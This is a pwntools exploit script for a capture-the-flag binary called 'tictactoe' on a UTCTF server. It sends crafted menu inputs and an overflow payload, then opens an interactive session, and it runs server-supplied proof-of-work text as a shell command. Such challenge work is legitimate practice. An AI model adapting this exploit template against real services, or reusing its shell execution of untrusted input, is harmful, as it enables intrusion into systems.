from pwn import *

context.arch = "amd64"
context.bits = 64
context.terminal = "tmux splitw -h".split()
context.log_level = "DEBUG"

s2u64 = lambda s: u64(s.ljust(8, b"\x00"))
i2b = lambda x: f"{x}".encode()
ptr_guard = lambda pos, ptr: (pos >> 12) ^ ptr


def remote_pow(txt):
    t.recvuntil(txt)
    cmd = t.recvline()
    res = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE).stdout
    t.sendline(res)


def check_addr_lsb(library, addr_str):
    with open(f"/proc/{t.pid}/maps", "r") as f:
        for l in f.readlines():
            if not library in l:
                continue
            assert l[12 - len(addr_str) :].startswith(addr_str)


def create_io() -> tubes.tube.tube:
    if local:
        if debug:
            if radare:
                io: tubes.tube.tube = process([elf_name], env={"LD_PRELOAD": libc_name})
                util.proc.wait_for_debugger(util.proc.pidof(io)[0])
                return io
            return gdb.debug([elf_name], script, env={"LD_PRELOAD": libc_name})
        return process([elf_name], env={"LD_PRELOAD": libc_name})
    return remote(remote_addr, int(remote_port))


def solve():
    global t
    sa = lambda x, y: t.sendafter(x, y)
    sla = lambda x, y: t.sendlineafter(x, y)

    t.sendline(b"x")
    sla(b":", i2b(5))
    sla(b":", i2b(3))
    sla(b":", i2b(4))
    sla(
        b":",
        b"9" * 0x2 + b"\0" * 0x43 + p32(1) + p32(0) + p64(0xDEADBEEF) + p64(0xCAFEBABE),
    )

    t.interactive()


local = 1
debug = 1
radare = 0

elf_name = "./tictactoe"
libc_name = ""
addr = "challenge.utctf.live 7114"
if addr.count(" ") == 1:
    remote_addr, remote_port = addr.split()
if libc_name:
    libc: ELF = ELF(libc_name)
elf: ELF = ELF(elf_name)
script = """
b *main+2835
c
"""
for _ in range(1):
    try:
        t = create_io()
        solve()
    except KeyboardInterrupt:
        break
    except AssertionError as e:
        continue
    except Exception as e:
        print(e)
    finally:
        t.close()
